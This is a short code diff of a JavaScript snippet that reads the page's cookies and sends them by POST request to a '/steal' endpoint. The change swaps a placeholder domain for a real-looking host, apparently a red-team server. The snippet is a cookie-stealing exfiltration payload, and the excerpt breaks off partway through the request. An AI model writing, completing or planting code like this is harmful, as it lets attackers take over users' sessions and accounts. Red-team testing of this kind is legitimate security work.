@@ -1,7 +1,7 @@
 (function() {
     const cookies = document.cookie;
 
-    fetch('https://YOUR-DOMAIN-HERE/steal', {
+    fetch('https://red-team-test.onrender.com/steal', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/x-www-form-urlencoded'
